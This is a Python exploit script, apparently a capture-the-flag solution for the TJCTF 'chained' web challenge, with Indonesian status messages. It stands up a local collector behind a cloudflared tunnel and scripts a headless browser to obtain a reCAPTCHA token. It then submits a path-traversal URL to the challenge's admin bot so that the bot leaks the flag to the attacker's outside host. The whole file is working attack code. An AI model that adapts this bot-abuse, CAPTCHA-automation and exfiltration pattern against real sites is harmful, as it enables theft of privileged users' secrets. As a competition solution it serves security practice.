import http.server
import queue
import re
import socketserver
import subprocess
import sys
import threading
import time
from contextlib import contextmanager

import requests
from playwright.sync_api import sync_playwright


BOT_URL = "https://admin-bot.tjctf.org/chained"
TARGET_BASE = "https://chained.tjc.tf/admin/../?url={callback}/leak?f="
TUNNEL_RE = re.compile(r"https://[-a-z0-9]+\.trycloudflare\.com")
FLAG_RE = re.compile(r"tjctf\{[^}\n]+\}")


class ReusableTCPServer(socketserver.TCPServer):
    allow_reuse_address = True


class LeakHandler(http.server.BaseHTTPRequestHandler):
    hits = queue.Queue()

    def do_GET(self):
        LeakHandler.hits.put(self.path)
        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, fmt, *args):
        pass


@contextmanager
def local_collector(port=0):
    server = ReusableTCPServer(("127.0.0.1", port), LeakHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield server
    finally:
        server.shutdown()
        server.server_close()


@contextmanager
def cloudflared_tunnel(local_port=8000):
    proc = subprocess.Popen(
        ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{local_port}"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
    )

    tunnel_url = None
    try:
        start = time.time()
        while time.time() - start < 30:
            line = proc.stdout.readline()
            if not line:
                if proc.poll() is not None:
                    raise RuntimeError("cloudflared mati sebelum memberi URL tunnel")
                continue
            match = TUNNEL_RE.search(line)
            if match:
                tunnel_url = match.group(0)
                break
        if not tunnel_url:
            raise RuntimeError("gagal mendapatkan URL tunnel dari cloudflared")
        yield tunnel_url
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()


def get_recaptcha_token():
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()
        page.goto(BOT_URL, wait_until="networkidle", timeout=60000)
        token = page.evaluate(
            """() => new Promise((resolve, reject) => {
                try {
                    const out = grecaptcha.execute(0);
                    if (out && typeof out.then === 'function') {
                        out.then(resolve).catch(reject);
                    } else {
                        resolve(out || '');
                    }
                } catch (e) {
                    reject(e);
                }
            })"""
        )
        browser.close()
    if not token:
        raise RuntimeError("gagal mengambil token reCAPTCHA")
    return token


def submit_to_bot(callback_url, token):
    payload_url = TARGET_BASE.format(callback=callback_url)
    response = requests.post(
        BOT_URL,
        data={"url": payload_url, "recaptcha_code": token},
        allow_redirects=False,
        timeout=30,
    )
    location = response.headers.get("location", "")
    if "The admin will visit your URL." not in location:
        raise RuntimeError(f"submit bot gagal: {response.status_code} {location}")
    return payload_url


def wait_for_flag(timeout=20):
    end = time.time() + timeout
    while time.time() < end:
        try:
            path = LeakHandler.hits.get(timeout=1)
        except queue.Empty:
            continue
        match = FLAG_RE.search(path)
        if match:
            return match.group(0)
    raise RuntimeError("flag tidak masuk ke collector dalam batas waktu")


def main():
    try:
        with local_collector() as server, cloudflared_tunnel(server.server_address[1]) as tunnel_url:
            print(f"[+] tunnel: {tunnel_url}")
            token = get_recaptcha_token()
            print(f"[+] recaptcha token length: {len(token)}")
            payload_url = submit_to_bot(tunnel_url, token)
            print(f"[+] payload submitted: {payload_url}")
            flag = wait_for_flag()
            print(f"<FLAG>{flag}</FLAG>")
    except KeyboardInterrupt:
        print("\n[!] dibatalkan", file=sys.stderr)
        sys.exit(130)
    except Exception as exc:
        print(f"[!] {exc}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
